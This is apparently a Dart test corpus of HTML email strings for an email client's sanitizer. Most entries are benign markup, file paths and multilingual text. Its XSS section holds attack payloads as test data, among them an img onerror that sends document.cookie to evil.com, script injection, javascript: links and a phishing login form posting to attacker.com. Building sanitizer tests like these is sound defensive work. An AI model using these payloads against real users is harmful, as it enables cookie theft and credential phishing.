/// Test corpus for HTML email content.
abstract final class HtmlEmailCorpus {
  // ─── Simple ────────────────────────────────────────────────────────────────
  static const String htmlSimple = '<p>Hello World</p>';
  static const String htmlWithBoldAndLink =
      '<p>Hello <strong>World</strong>! '
      'Visit <a href="https://example.com">our site</a> today.</p>';
  static const String htmlWithUnicode = '<p>مرحبا 🎉 résumé 日本語 한국어</p>';

  // ─── Backslash namespace / path patterns in text nodes ────────────────────
  static const String htmlWithBackslashInCode =
      r'<p>Error: <code>\App\DB\Exception\AuthFailed</code> — access denied.</p>'
      '<p>Please check the docs for details.</p>';
  static const String htmlWithBackslashMultipleNodes =
      r'<h2>Error Report</h2>'
      r'<p>Exception: <code>\App\DB\Exception\NotFound</code></p>'
      r'<p>Stack: <code>\App\Router\Dispatcher::dispatch()</code></p>';
  static const String htmlWithBackslashAndLink =
      r'<p>Exception: <code>\App\DB\Exception\AuthFailed</code>.</p>'
      '<p>See <a href="https://docs.example.com/errors">the docs</a> for the fix.</p>';
  static const String htmlWithWindowsPath =
      r'<p>Log file: <code>C:\Users\Admin\AppData\Local\Temp\error.log</code></p>';
  static const String htmlWithGoPath =
      r'<p>FAILED: <code>\github.com\org\repo\pkg\handler\main.go</code></p>';

  // bare \XX text nodes — see skipped test for known sanitizer limitation
  static const String htmlAllHexBackslashParagraphs =
      r'<p>Path: \AB\CD\EF</p>'
      r'<p>Config: \01\23\45</p>';

  // ─── XSS ───────────────────────────────────────────────────────────────────
  static const String htmlWithScriptTag =
      '<p>Before</p><script>document.cookie="stolen";</script><p>After</p>';
  static const String htmlWithImgOnerror =
      '<p>Before</p>'
      "<img src=\"x\" onerror=\"fetch('https://evil.com/'+document.cookie)\">"
      '<p>After</p>';
  static const String htmlWithJavascriptLink =
      '<p><a href="javascript:alert(1)">Click me</a></p>';
  static const String htmlWithIframe =
      '<p>Content</p><iframe src="https://evil.com/phish"></iframe><p>End</p>';
  static const String htmlWithFormPhishing =
      '<form action="https://attacker.com" method="POST">'
      '<input type="text" name="user" placeholder="Username">'
      '<input type="password" name="pass" placeholder="Password">'
      '<button>Login</button>'
      '</form>';
  static const String htmlXssRich =
      '<div>'
      '<script>document.cookie="stolen";</script>'
      '<img src=x onerror="alert(1)">'
      '<svg><script>alert(\'svg\')</script></svg>'
      '<a href="javascript:void(0)" onclick="alert(1)">Click</a>'
      '<p onmouseover="alert(1)">Hover</p>'
      '<p>Valid content after XSS.</p>'
      '</div>';
  static const String htmlWithDataUriHref =
      '<p><a href="data:text/html,<h1>phish</h1>" id="phish">link</a></p>';

  // ─── Hyperlinks ────────────────────────────────────────────────────────────
  static const String htmlWithMultipleLinks =
      '<p>Visit <a href="https://example.com">main site</a>, '
      '<a href="https://docs.example.com">docs</a>, or '
      '<a href="mailto:support@example.com">email support</a>.</p>';
  static const String htmlWithJavascriptHref =
      '<p><a href="javascript:alert(1)" id="bad-link">Do not click</a></p>';

  // ─── Complex / nested ──────────────────────────────────────────────────────
  static const String htmlComplexNested = '<html>\n'
      '<head>\n'
      '  <meta charset="UTF-8">\n'
      '  <style>\n'
      '    body { font-family: Arial, sans-serif; margin: 0; }\n'
      '    .header { background: #4285F4; color: white; padding: 16px; }\n'
      '    table { border-collapse: collapse; width: 100%; }\n'
      '    th, td { border: 1px solid #ddd; padding: 8px; }\n'
      '  </style>\n'
      '</head>\n'
      '<body>\n'
      '  <div class="header">\n'
      '    <h1>Monthly Performance Report — May 2026</h1>\n'
      '    <p>Prepared by: <a href="mailto:alice@example.com" style="color:white">Alice</a></p>\n'
      '  </div>\n'
      '  <div style="padding: 16px;">\n'
      '    <h2>Revenue by Department</h2>\n'
      '    <table>\n'
      '      <thead><tr><th>Department</th><th>Revenue</th><th>Growth</th></tr></thead>\n'
      '      <tbody>\n'
      r'        <tr><td>Engineering</td><td>$1,200,000</td><td style="color:green">+12%</td></tr>' '\n'
      r'        <tr><td>Sales</td><td>$850,000</td><td style="color:green">+8%</td></tr>' '\n'
      '      </tbody>\n'
      '    </table>\n'
      '    <ul>\n'
      '      <li><strong>Q2 Budget Review</strong>: <em>Schedule by June 15</em></li>\n'
      '      <li>Submit at <a href="https://finance.example.com/budget">finance portal</a></li>\n'
      '    </ul>\n'
      '    <p>Full details: <a href="https://reports.example.com/may-2026">reports.example.com</a></p>\n'
      '  </div>\n'
      '</body>\n'
      '</html>';
  static const String htmlDeeplyNested =
      '<div><section><article><aside>'
      '<p><strong><em><span style="color:red">deeply nested content</span></em></strong></p>'
      '</aside></article></section></div>';
  static const String htmlMarkdownRendered =
      '<h1>Monthly Report</h1>'
      '<h2>Summary</h2>'
      '<ul>'
      '<li><strong>Revenue:</strong> \$1.2M (+12%)</li>'
      '<li><strong>Active users:</strong> 45,000</li>'
      '</ul>'
      '<p><strong>Action:</strong> Review at '
      '<a href="https://analytics.example.com">analytics dashboard</a> by EOD.</p>'
      '<pre><code>def calc(x): return x * 1.12</code></pre>';

  // ─── Encoded entities ──────────────────────────────────────────────────────
  static const String htmlWithEncodedEntities =
      '<p>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</p>'
      '<p>Price: 10 &amp; 20 = 30</p>';
  static const String htmlDoubleEncoded =
      '<p>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</p>';

  // ─── Multi-language ────────────────────────────────────────────────────────
  static const String htmlRtlArabic =
      '<div dir="rtl"><p>مرحبا بالعالم</p><p>البريد الإلكتروني</p></div>';
  static const String htmlCjk =
      '<p>日本語: メールクライアント</p>'
      '<p>中文: 电子邮件客户端</p>'
      '<p>한국어: 이메일 클라이언트</p>';
}
